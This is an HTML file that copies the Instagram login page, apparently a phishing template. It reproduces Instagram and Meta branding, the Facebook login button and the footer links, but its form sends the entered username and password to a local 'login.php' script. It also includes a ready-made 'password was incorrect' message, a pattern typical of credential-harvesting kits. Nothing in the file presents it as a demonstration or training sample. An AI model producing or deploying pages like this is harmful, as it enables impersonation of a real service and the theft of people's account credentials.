<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px 30px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            font-family: 'Billabong', 'Segoe UI', sans-serif;
            font-size: 42px;
            margin-bottom: 25px;
            color: #262626;
        }
        @font-face {
            font-family: 'Billabong';
            src: url('https://cdn.jsdelivr.net/gh/SuecoMarcus/Instagram-Font@master/Billabong.ttf');
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            outline: none;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            opacity: 0.7;
        }
        .login-btn.active {
            opacity: 1;
        }
        .login-btn:hover {
            background: #1877f2;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            padding: 0 18px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }
        .fb-login {
            background: none;
            border: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 8px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .fb-login img {
            width: 16px;
            height: 16px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .get-app {
            margin-top: 15px;
            text-align: center;
        }
        .get-app p {
            font-size: 14px;
            margin-bottom: 15px;
        }
        .app-badges {
            display: flex;
            gap: 8px;
            justify-content: center;
        }
        .app-badges img {
            height: 40px;
        }
        .error-msg {
            color: #ed4956;
            font-size: 12px;
            margin: 8px 0;
            display: none;
        }
        footer {
            margin-top: 30px;
            font-size: 12px;
            color: #737373;
            text-align: center;
            max-width: 700px;
            line-height: 1.5;
        }
        footer a {
            color: #737373;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">Instagram</div>

    <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please try again.</div>

    <form id="loginForm" method="POST" action="login.php">
        <input type="text" name="username" id="username" placeholder="Phone number, username or email address" required>
        <input type="password" name="password" id="password" placeholder="Password" required>
        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
    </form>

    <div class="divider">
        <div class="divider-line"></div>
        <div class="divider-text">OR</div>
        <div class="divider-line"></div>
    </div>

    <button class="fb-login">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
            <path fill="#385185" d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
        </svg>
        Log in with Facebook
    </button>

    <a href="#" class="forgot-password">Forgot password?</a>
</div>

<div class="signup-box">
    Don't have an account? <a href="#">Sign up</a>
</div>

<div class="get-app">
    <p>Get the app.</p>
    <div class="app-badges">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
    </div>
</div>

<footer>
    <a href="#">Meta</a>
    <a href="#">About</a>
    <a href="#">Blog</a>
    <a href="#">Jobs</a>
    <a href="#">Help</a>
    <a href="#">API</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Locations</a>
    <a href="#">Instagram Lite</a>
    <a href="#">Threads</a>
    <a href="#">Contact Uploading & Non-Users</a>
    <a href="#">Meta Verified</a>
    <br><br>
    English © 2025 Instagram from Meta
</footer>

<script>
    // Toggle button opacity when fields are filled
    const username = document.getElementById('username');
    const password = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');

    function checkFields() {
        if (username.value.length > 0 && password.value.length > 0) {
            loginBtn.classList.add('active');
        } else {
            loginBtn.classList.remove('active');
        }
    }

    username.addEventListener('input', checkFields);
    password.addEventListener('input', checkFields);
</script>
</body>
</html>
